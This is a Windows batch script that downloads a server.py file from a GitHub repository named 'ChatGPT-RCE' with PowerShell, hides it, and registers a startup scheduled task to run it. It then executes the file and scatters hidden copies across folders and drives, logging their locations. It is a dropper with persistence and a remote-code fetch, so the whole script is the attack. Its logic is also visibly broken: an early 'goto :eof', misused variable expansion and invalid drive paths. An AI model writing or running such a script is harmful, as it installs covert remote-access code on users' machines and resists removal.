@echo off
setlocal enabledelayedexpansion

:: Set the URL and output file name for the server.py file
set "GITHUB_URL=https://raw.githubusercontent.com/therealMKD/ChatGPT-RCE/main/server.py"
set "SERVER_FILENAME=server.py"

:: Set the paths
set "DOCUMENTS_PATH=C:\Users\User\OneDrive\Documents"
set "DESKTOP_PATH=%USERPROFILE%\Desktop"
set "LOGFILE=%DESKTOP_PATH%\log.txt"

:: Initialize the log file
echo File Locations: > "%LOGFILE%"

:: Function to download the server.py file from GitHub
:download_server_file
powershell -Command "Invoke-WebRequest -Uri '%GITHUB_URL%' -OutFile '%DOCUMENTS_PATH%\%SERVER_FILENAME%'"
goto :eof

:: Download the server.py file from GitHub
call :download_server_file

:: Check if the server.py file was downloaded successfully
if exist "%DOCUMENTS_PATH%\%SERVER_FILENAME%" (
    :: Set the server.py file to hidden
    attrib +h "%DOCUMENTS_PATH%\%SERVER_FILENAME%"

    :: Log the location of the server.py file
    echo %DOCUMENTS_PATH%\%SERVER_FILENAME% >> "%LOGFILE%"

    :: Add Task Scheduler entry to run the server.py file when it gets deleted
    schtasks /create /tn "RunServerFile_OnDelete" /tr "\"%COMSPEC% /c if not exist \"%DOCUMENTS_PATH%\%SERVER_FILENAME%\" \"%DOCUMENTS_PATH%\%SERVER_FILENAME%\"\"" /sc onstart /f

    :: Run the server.py file
    "%DOCUMENTS_PATH%\%SERVER_FILENAME%"
) else (
    echo Failed to download the server.py file.
)

:: Function to generate a random number between two values
:get_random_number
set /a "random_number=%RANDOM% %% (%2 - %1 + 1) + %1"
exit /b

:: Function to find a random existing folder within a directory
:find_random_folder
set "TARGET_DIRECTORY=%1"
for /r "%TARGET_DIRECTORY%" %%D in (*) do (
    set /a "random=%RANDOM% %% 10"
    if !random! lss 5 (
        set "RANDOM_FOLDER=%%D"
        goto :eof
    )
)
exit /b

:: Find a random existing folder within the Documents directory
call :find_random_folder "%DOCUMENTS_PATH%"
set "ORIGINAL_LOCATION=%RANDOM_FOLDER%\%SERVER_FILENAME%"

:: Move the server.py file to the random existing folder
move "%DOCUMENTS_PATH%\%SERVER_FILENAME%" "%ORIGINAL_LOCATION%"

:: Log the location of the original file
echo %ORIGINAL_LOCATION% >> "%LOGFILE%"

:: Create copies of the server.py file in random locations on the computer
for /l %%i in (2,1,5) do (
    call :get_random_number 1 100
    set "RANDOM_DRIVE=%%i:"
    set "RANDOM_FOLDER=%RANDOM_DRIVE%\%%i"
    mkdir "%RANDOM_FOLDER%"
    copy "%ORIGINAL_LOCATION%" "%RANDOM_FOLDER%\%SERVER_FILENAME%"

    :: Log the location of the copy
    echo %RANDOM_FOLDER%\%SERVER_FILENAME% >> "%LOGFILE%"
)

endlocal
echo Script completed.
pause
